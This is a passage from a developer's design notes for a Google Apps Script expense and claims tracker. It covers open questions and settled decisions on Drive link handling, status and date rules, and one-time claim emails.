Script Property on the old account. `getIcloudEmail()` then throws, the caller
catches and logs, no email is sent, and Health Done still flips status and
renames Drive files. Then delete the iOS automation so the failure notifications
stop.

---

## Open questions

- **Keep `3-45` or revert to `3.45` in filenames?** One line in `Config.js`.
- **Is `Invoiced` the state every Income row starts in?** If so its date is
  manual, so the form must ask for it at submission. Today `initializeEntry`
  stamps it with today's date when blank, which is probably wrong for a
  backdated invoice.
- **Can you advance to a state without its date yet**, or is the date required?

- **Work's `Type` option list** in `Config.js` is proposed, not taken from real
  data. Confirm it against what you actually claim for.
- Where OCR runs: Drive's built-in OCR vs an API, and how confident it needs to
  be before autofilling rather than prompting

### Settled since

- **Document links say which account to open them as.** Every document read
  "You need access" in a browser with two Google accounts signed in — the file
  was fine and so was the link, it was being opened as the wrong person, because
  a bare `drive.google.com` URL resolves against the browser's *default* account
  rather than the one signed into the page. `uiFileUrl()` now appends
  `authuser=<address>`, and the address is the one that just passed the access
  check, so each link is built for whoever is actually looking instead of naming
  one account for everybody. Drive references are rebuilt from their ID so the
  hint reaches the ones stored as full URLs too — which is all of them that
  `createEntry` wrote. Anything that is not a Drive link is passed through
  untouched: reading an ID out of some other service's URL would break a link
  that worked.
- **`uiEntry()` checks the caller itself.** It returns a whole row and is a
  global like any other, so `google.script.run` reaches it without going through
  `uiSetStatus`. It had been relying on the functions that call it, which is
  exactly the assumption the rule exists to refuse.
- **A date cannot be set for a state the row has not reached.** Found by
  clicking, not by reading: a `Claimed Date` could be typed onto a row still in
  `To Do`, and the next transition would clear it, because `setStatus` wipes the
  dates of every state after the target. Accepting a value that quietly
  disappears is worse than refusing it, so `setEntryDate` now refuses, naming the
  state and telling you to select it instead. Two exceptions: clearing is always
  allowed, and a row whose `Status` is off-vocabulary stays editable, since the
  UI is the only place a hand-edited sheet gets noticed and it has to remain
  repairable from there. The page follows the same rule — an unreached state's
  date chip is not a control — but the rule lives on the server, because the
  client is never trusted.
- **A file failure does not roll back the status change.** Confirmed live and
  worth stating plainly, since it looks like a bug the first time: the status
  moves, the date is written, and the failed rename is reported in the same
  breath. Rolling back would leave the row misdescribing where it is, and the
  rename is recoverable — the suffix chain is rebuilt from the row's dates on
  every transition, so fixing the URL and re-selecting the state repairs the
  filename.
- **Claim emails fire once, when the document is there, and at no other time.**
  Work and IVA both mail on creation, gated on the entry being complete and its
  document actually opening. A `Claim Emailed` column — present only in sections
  that mail — is stamped after a successful send, so no caller can produce a
  second claim however many times it runs. `sendPendingClaim(section, row)`
  re-runs the same gate for a receipt that arrived later, which is the Siri case:
  the entry defers at creation and the claim goes out when the file lands. The
  stamp is written only after the send succeeds, so a failure leaves the claim
  genuinely unsent rather than silently marked done.
- **Google Forms** — removed from v2 entirely. Custom form in the web app.
- **Income needs no Drive presence.** It has no `fileColumns`, so `bootstrap()`
  creates no folders for it and `applyFileState` never asks for one. The sheet
  row is the whole record.
- **Income's field names** — moot. v2 defines its own header spine, generated
  from `SECTIONS`, rather than inheriting v1's.
- **IVA email recipient** — unchanged address, now a Script Property rather
  than hardcoded. Value in `.env` as `V2_IVA_CLAIM_RECIPIENT`.
- **Drive folder names** — `section.sheet`, so `Work/ IVA/ Health/ Income/`.
